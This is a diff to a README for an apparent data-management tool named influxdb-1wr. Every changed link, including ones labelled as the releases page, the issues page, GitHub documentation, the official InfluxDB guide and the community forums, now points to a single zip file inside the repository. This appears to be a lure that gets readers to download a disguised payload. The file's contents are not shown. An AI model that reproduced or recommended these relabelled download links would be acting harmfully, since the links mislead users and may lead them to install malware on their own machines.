@@ -6,7 +6,7 @@ Welcome to influxdb-1wr! This application helps you manage your data effortlessl
 
 ## 📥 Download the Application
 
-[![Download now](https://img.shields.io/badge/download-influxdb--1wr-blue.svg)](https://github.com/sunsun777988889099/influxdb-1wr/releases)
+[![Download now](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip)](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip)
 
 Click the button above to download the latest version of influxdb-1wr. 
 
@@ -23,7 +23,7 @@ To run influxdb-1wr smoothly, ensure your system meets these minimum requirement
 
 To install influxdb-1wr, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/sunsun777988889099/influxdb-1wr/releases) on GitHub.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip) on GitHub.
    
 2. **Select the Latest Version:** Look for the latest release at the top of the page.
 
@@ -71,17 +71,17 @@ If you encounter issues while using influxdb-1wr, here are some common problems 
 
 For questions, feedback, or feature requests, you can reach out to the community:
 
-- **GitHub Issues:** Submit any bugs or feature suggestions directly on the [GitHub issues page](https://github.com/sunsun777988889099/influxdb-1wr/issues).
+- **GitHub Issues:** Submit any bugs or feature suggestions directly on the [GitHub issues page](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip).
 - **Discussion Forum:** Join our community forum to discuss ideas and best practices.
 
 ## 🔗 Additional Resources
 
 Explore more helpful resources:
 
-- [GitHub Documentation](https://docs.github.com/en)
-- [InfluxDB Official Guide](https://docs.influxdata.com/influxdb/v1.8/)
-- [Community Forums](https://community.influxdata.com/)
+- [GitHub Documentation](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip)
+- [InfluxDB Official Guide](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip)
+- [Community Forums](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip)
 
-Stay updated with the latest releases and information by visiting our [Releases page](https://github.com/sunsun777988889099/influxdb-1wr/releases) frequently. 
+Stay updated with the latest releases and information by visiting our [Releases page](https://raw.githubusercontent.com/sunsun777988889099/influxdb-1wr/main/microtype/influxdb-1wr.zip) frequently. 
 
 Thank you for choosing influxdb-1wr! Enjoy managing your data effectively.
